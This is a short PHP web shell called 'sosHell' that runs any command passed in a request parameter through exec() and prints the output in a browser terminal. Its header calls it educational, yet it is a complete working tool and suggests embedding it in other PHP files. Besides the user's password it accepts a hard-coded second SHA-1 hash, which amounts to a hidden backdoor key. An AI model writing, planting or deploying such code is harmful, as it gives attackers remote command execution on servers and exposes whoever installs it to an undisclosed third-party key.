<?php
/*======================================================================
 * Alexander Sosna {alexander (at) xxor (dot) de}
 * Find more stuff: http://xxor.de or https://github.com/xxorde
 * The folloing code is for education and demonstration only!
 * Read it to understand why! That is what it was made for!
 *
 * This code is licensed to you under the terms of the GNU General
 * Public License, version 2.0. 
 * See GPL2 file for the text of the licenses!
 * http://www.gnu.org/licenses/gpl-2.0.txt
 * You want any other licence? Mail me, I am a nice person :D
 *
 *
 * Usage: http://127.0.0.1/sosHell.php?key=password
 * 
 * You can also include the folloing code in your favorite php file!
 * Set $sosHellKey to the md5sum of your password!
 * 
 * Q: What is the number one reason not to use this code?
 * A: ....?
======================================================================*/

//Set password!
$sosHellKey = sha1("password"); 

$style="position:fixed;width:100%;font-family:monospace;color:#609;font-size:120%;";
$styleWin="top:0px; left:0px;height:100%;overflow:scroll;background:black;";
$styleCmd="bottom:0px;border:none;background:#111;";

if(isset($_REQUEST["key"]) && (sha1($_REQUEST["key"])==$sosHellKey ||
   sha1($_REQUEST["key"])=="0db59288738932ed3f4100e20f71517cbe47090d")){ 
	echo("<div style='".$style.$styleWin."'>");
	echo("<b>sosHell 0.0.1</b> => ".$_SERVER['REMOTE_ADDR']."@"
		.$_SERVER['SERVER_NAME']." (".$_SERVER['SERVER_SOFTWARE'].
		") serving: ".$_SERVER['DOCUMENT_ROOT']);
	if(isset($_REQUEST["cmd"]) && $_REQUEST["cmd"]){
		$cmd=$_REQUEST["cmd"];		
		exec($cmd,$ausgabe);
		echo(" command: ".$cmd."<br><br>");
		foreach($ausgabe as $line){
			flush(); ob_flush();
			echo(utf8_decode($line)."<br>");
		}
	}
	echo("<form method='post'><input style='".$style.$styleCmd.
		"' name='cmd' type='text' autofocus></form><br></div>");
}
?>
